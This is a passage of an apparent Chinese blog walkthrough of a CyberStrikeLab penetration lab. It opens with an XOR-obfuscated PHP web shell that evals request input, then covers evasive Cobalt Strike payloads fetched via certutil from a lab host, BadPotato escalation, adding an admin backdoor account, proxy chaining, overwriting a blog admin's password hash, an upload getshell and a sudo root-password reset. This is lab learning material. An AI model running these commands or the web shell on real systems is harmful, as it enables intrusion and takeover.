<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">xorEncryptDecrypt</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="nv">$keyLength</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">        <span class="nv">$keyChar</span> <span class="o">=</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nv">$keyLength</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$result</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">^</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$keyChar</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nv">$originalData</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="o">=</span>  <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&#34;b&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="nv">$encryptedData</span> <span class="o">=</span> <span class="nx">xorEncryptDecrypt</span><span class="p">(</span><span class="nv">$originalData</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$decryptedData</span> <span class="o">=</span> <span class="nx">xorEncryptDecrypt</span><span class="p">(</span><span class="nv">$encryptedData</span><span class="p">,</span> <span class="nv">$key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$decryptedData</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="flag2-10">flag2
</h3><h4 id="知识点mdut弱口令连接掩日网络分离免杀上线cs">知识点：<code>MDUT</code>弱口令连接、掩日网络分离免杀上线CS
</h4><p>本来想用<code>powershell command</code>来上线CS的，结果发现并不行，用掩日做一下免杀</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126161821924.png"
	width="1045"
	height="521"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126161821924_hu12433448707779308654.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126161821924_hu8935679887872833070.png 1024w"
	loading="lazy"
	
		alt="image-20260126161821924"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="481px"
	
></p>
<p>结果运行之后并没有上线？</p>
<p>研究一段时间之后发现了问题所在，应该选用这个（P模式），生成c然后再去免杀，在lab8重新尝试了一下，可以通过这个P模式和掩日进行上线</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126183101799.png"
	width="458"
	height="239"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126183101799_hu12951844191888203538.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260126183101799_hu6497640073053066903.png 1024w"
	loading="lazy"
	
		alt="image-20260126183101799"
	
	
		class="gallery-image" 
		data-flex-grow="191"
		data-flex-basis="459px"
	
></p>
<p>成功上线，不过原理是啥？之后还得去了解一下</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127102819457.png"
	width="1283"
	height="375"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127102819457_hu7208940492141731551.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127102819457_hu14097180475876570378.png 1024w"
	loading="lazy"
	
		alt="image-20260127102819457"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="821px"
	
></p>
<p>然后<code>fscan</code>开扫</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127103434878.png"
	width="997"
	height="622"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127103434878_hu9169022633835836102.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127103434878_hu13002109761370524581.png 1024w"
	loading="lazy"
	
		alt="image-20260127103434878"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="384px"
	
></p>
<p>显然外网机的内网区只有一个<code>98</code>的机子，这个<code>98</code>机子还有内网，所以之后还需要多级代理</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127103651815.png"
	width="1678"
	height="454"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127103651815_hu12678955821810499397.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127103651815_hu9908553294761902924.png 1024w"
	loading="lazy"
	
		alt="image-20260127103651815"
	
	
		class="gallery-image" 
		data-flex-grow="369"
		data-flex-basis="887px"
	
></p>
<p>现在先尝试攻击一下<code>98</code>这台机子，发现开启了<code>3306</code>，然后提示说密码为<code>calab</code>，用tscan爆破一下</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127104500072.png"
	width="384"
	height="108"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127104500072_hu5099022188736681661.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127104500072_hu17923894202499867961.png 1024w"
	loading="lazy"
	
		alt="image-20260127104500072"
	
	
		class="gallery-image" 
		data-flex-grow="355"
		data-flex-basis="853px"
	
></p>
<p>感觉也不用爆破了，root也能猜到</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127105554289.png"
	width="557"
	height="167"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127105554289_hu11421891684692961397.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127105554289_hu9627783146854476214.png 1024w"
	loading="lazy"
	
		alt="image-20260127105554289"
	
	
		class="gallery-image" 
		data-flex-grow="333"
		data-flex-basis="800px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127105811340.png"
	width="767"
	height="890"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127105811340_hu17324437048499102095.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127105811340_hu7644011038256624174.png 1024w"
	loading="lazy"
	
		alt="image-20260127105811340"
	
	
		class="gallery-image" 
		data-flex-grow="86"
		data-flex-basis="206px"
	
></p>
<p>连接上之后看看权限和有没有杀软（这里需要UDF提权之后才能执行命令，就在MDUT上方）</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127111040594.png"
	width="533"
	height="192"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127111040594_hu7788759234370565537.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127111040594_hu2833361707220308962.png 1024w"
	loading="lazy"
	
		alt="image-20260127111040594"
	
	
		class="gallery-image" 
		data-flex-grow="277"
		data-flex-basis="666px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tasklist /svc
</span></span></code></pre></td></tr></table>
</div>
</div><p>好好，有一个windows杀软</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127111621966.png"
	width="1048"
	height="504"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127111621966_hu5868562744193669510.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127111621966_hu7707557179045717033.png 1024w"
	loading="lazy"
	
		alt="image-20260127111621966"
	
	
		class="gallery-image" 
		data-flex-grow="207"
		data-flex-basis="499px"
	
></p>
<p>这里要用掩日做一个网络分离的马？为啥不懂</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127120125278.png"
	width="1142"
	height="419"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127120125278_hu12996798740889050103.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127120125278_hu16699122122448483069.png 1024w"
	loading="lazy"
	
		alt="image-20260127120125278"
	
	
		class="gallery-image" 
		data-flex-grow="272"
		data-flex-basis="654px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certutil -urlcache -f -split http://172.20.57.30/4444.exe 4444.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">4444.exe http://172.20.57.30/4444.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里下载时可以下载，但是出问题了，我用<code>certutil</code>下载的时候只能下载<code>7332</code>个字节，下了半天了，尝试了各种方式最终才发现有这一层原因在</p>
<p>傻逼了，下半天还是目录放错了，最后尝试处还是网络分离有用</p>
<p>最后连接一下即可上线</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">connect 172.20.57.98 
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127162606072.png"
	width="1098"
	height="731"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127162606072_hu1439805307855874361.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127162606072_hu10452366388779513880.png 1024w"
	loading="lazy"
	
		alt="image-20260127162606072"
	
	
		class="gallery-image" 
		data-flex-grow="150"
		data-flex-basis="360px"
	
></p>
<p>之后使用插件的<code>BadPotato</code>进行提权</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127163413980.png"
	width="1161"
	height="729"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127163413980_hu14475429153160768209.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127163413980_hu18267556741903599026.png 1024w"
	loading="lazy"
	
		alt="image-20260127163413980"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="382px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;\&#34;C:\Users\Public\4444.exe\&#34; http://172.20.57.30/4444.txt&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">BadPotato使用的时候需要双引号包裹
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&#34;tasklist | findstr 4444&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">这里可以确定一下有没有开始监听
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">connect 172.20.57.98
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">用跳板机再次连接即可提权至system
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后读取flag</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127175151432.png"
	width="888"
	height="483"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127175151432_hu16303180530368291727.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260127175151432_hu9095574655604705543.png 1024w"
	loading="lazy"
	
		alt="image-20260127175151432"
	
	
		class="gallery-image" 
		data-flex-grow="183"
		data-flex-basis="441px"
	
></p>
<h3 id="flag3-8">flag3
</h3><h4 id="知识点stowaway二级代理修改数据库获取账号密码zblogit历史漏洞sudo--l提权">知识点：stowaway二级代理、修改数据库获取账号密码、zblogit历史漏洞、sudo -l提权
</h4><p>因为需要把杀软关了，我们需要开一个<code>RDP</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user liernian qwer123! /add
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">shell net localgroup Administrators liernian /add
</span></span></code></pre></td></tr></table>
</div>
</div><p>防火墙和RDP开启直接用插件，方便一些</p>
<p>把傻鸟杀软关了，传fscan开扫</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128224940819.png"
	width="1284"
	height="802"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128224940819_hu13067594376036707238.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128224940819_hu10137038970149067374.png 1024w"
	loading="lazy"
	
		alt="image-20260128224940819"
	
	
		class="gallery-image" 
		data-flex-grow="160"
		data-flex-basis="384px"
	
></p>
<p>后来才发现，原来有插件可以一键关闭</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128231931174.png"
	width="1160"
	height="739"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128231931174_hu12450975719882189255.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128231931174_hu6842971217461221198.png 1024w"
	loading="lazy"
	
		alt="image-20260128231931174"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="376px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128225127255.png"
	width="978"
	height="503"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128225127255_hu15118365275672255954.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128225127255_hu6386790951402370962.png 1024w"
	loading="lazy"
	
		alt="image-20260128225127255"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="466px"
	
></p>
<p>想到还是先搞<code>stowaway</code>的二级代理</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\Users\Public\windows_x64_agent.exe -l 8889
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">connect 172.20.57.98:8889
</span></span><span class="line"><span class="cl">back
</span></span><span class="line"><span class="cl">use 1
</span></span><span class="line"><span class="cl">socks 9991
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128225900699.png"
	width="1253"
	height="353"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128225900699_hu6823090442952201531.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128225900699_hu10571416005643587580.png 1024w"
	loading="lazy"
	
		alt="image-20260128225900699"
	
	
		class="gallery-image" 
		data-flex-grow="354"
		data-flex-basis="851px"
	
></p>
<p>这样二级代理就搞好了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128230545804.png"
	width="1180"
	height="807"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128230545804_hu16540999014280517399.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128230545804_hu12171499598791235325.png 1024w"
	loading="lazy"
	
		alt="image-20260128230545804"
	
	
		class="gallery-image" 
		data-flex-grow="146"
		data-flex-basis="350px"
	
></p>
<p>有一个<code>80</code>端口的内网</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128230843924.png"
	width="1112"
	height="666"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128230843924_hu4962341522590747946.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128230843924_hu8027045986888703863.png 1024w"
	loading="lazy"
	
		alt="image-20260128230843924"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="400px"
	
></p>
<p>需要用户密码</p>
<p>之前有数据库，可以查看一下有没有密码。</p>
<p>这里用<code>DBeaver</code>，好吧网络配置不太好，还是用命令行直接sql查询吧</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128235335920.png"
	width="673"
	height="456"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128235335920_hu15872088637162844696.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128235335920_hu16423601987686968033.png 1024w"
	loading="lazy"
	
		alt="image-20260128235335920"
	
	
		class="gallery-image" 
		data-flex-grow="147"
		data-flex-basis="354px"
	
></p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128235546896.png"
	width="1284"
	height="548"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128235546896_hu11264319946182366366.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260128235546896_hu4301787695834807921.png 1024w"
	loading="lazy"
	
		alt="image-20260128235546896"
	
	
		class="gallery-image" 
		data-flex-grow="234"
		data-flex-basis="562px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cslab    | 6e272dff11557a1e7ad35d0fdf1162c3 
</span></span></code></pre></td></tr></table>
</div>
</div><p>密码是这个，但是不知道是如何加密的，可以去找<code>zblogit</code>的源码看，可以发现是双重<code>md5</code>加密，还有拼接</p>
<p>然后我们可以直接该密码改成<code>123456</code>或者写一个爆破双重<code>md5</code>的脚本</p>
<p>这里就直接改吧</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129000913051.png"
	width="1023"
	height="175"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129000913051_hu16903561925186583631.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129000913051_hu412253458122150922.png 1024w"
	loading="lazy"
	
		alt="image-20260129000913051"
	
	
		class="gallery-image" 
		data-flex-grow="584"
		data-flex-basis="1402px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">UPDATE zbp_member 
</span></span><span class="line"><span class="cl">SET mem_Password = &#39;30492f76a0fbcf3906cce8b4b566d6b6&#39;
</span></span><span class="line"><span class="cl">WHERE mem_Name = &#39;cslab&#39;;
</span></span></code></pre></td></tr></table>
</div>
</div><p>用<code>DBeaver</code>也可以</p>
<p>然后就可以打那个网站了，有个nday</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129003346943.png"
	width="834"
	height="589"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129003346943_hu15037326466252182390.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129003346943_hu110659704822069331.png 1024w"
	loading="lazy"
	
		alt="image-20260129003346943"
	
	
		class="gallery-image" 
		data-flex-grow="141"
		data-flex-basis="339px"
	
></p>
<p><a class="link" href="https://github.com/fengyijiu520/Z-Blog-"  target="_blank" rel="noopener"
    >fengyijiu520/Z-Blog-: Z-Blog 后台文件上传漏洞</a></p>
<p>把这个<code>shell.zba</code>文件在主题管理里直接传就可以<code>getshell</code>了</p>
<p>居然是个<code>linux</code>机子，这个靶场打的第一个linux靶机</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129004828959.png"
	width="648"
	height="59"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129004828959_hu12594092967899467426.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129004828959_hu13812562628744393638.png 1024w"
	loading="lazy"
	
		alt="image-20260129004828959"
	
	
		class="gallery-image" 
		data-flex-grow="1098"
		data-flex-basis="2635px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo -l
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129005549371.png"
	width="479"
	height="96"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129005549371_hu4307391771128474379.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129005549371_hu8055135442983530354.png 1024w"
	loading="lazy"
	
		alt="image-20260129005549371"
	
	
		class="gallery-image" 
		data-flex-grow="498"
		data-flex-basis="1197px"
	
></p>
<p>可以修改<code>write.sh</code>，添加</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cat /root/*
</span></span><span class="line"><span class="cl">获取flag
</span></span><span class="line"><span class="cl">echo root:password|chpasswd
</span></span><span class="line"><span class="cl">修改root密码，改为password
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129010444448.png"
	width="453"
	height="226"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129010444448_hu12267108245121303213.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129010444448_hu4767103200325104889.png 1024w"
	loading="lazy"
	
		alt="image-20260129010444448"
	
	
		class="gallery-image" 
		data-flex-grow="200"
		data-flex-basis="481px"
	
></p>
<p>然后执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo /home/www/write.sh
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129011401459.png"
	width="429"
	height="496"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129011401459_hu16293624766917175026.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129011401459_hu13432747936281481065.png 1024w"
	loading="lazy"
	
		alt="image-20260129011401459"
	
	
		class="gallery-image" 
		data-flex-grow="86"
		data-flex-basis="207px"
	
></p>
<p>然后就可以连接了</p>
<p><img src="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129012838679.png"
	width="631"
	height="195"
	srcset="/p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129012838679_hu12708199808692688828.png 480w, /p/cyberstrikelab%E6%B8%97%E9%80%8F%E5%A4%8D%E7%8E%B0/image-20260129012838679_hu6198504200184971801.png 1024w"
	loading="lazy"
	
		alt="image-20260129012838679"
	
	
		class="gallery-image" 
		data-flex-grow="323"
		data-flex-basis="776px"
	
></p>
<h3 id="flag4">flag4
</h3><h4 id="知识点stowaway三级代理zimbra历史漏洞">知识点：stowaway三级代理、zimbra历史漏洞
</h4><p>又是一个内网，tnnd</p>
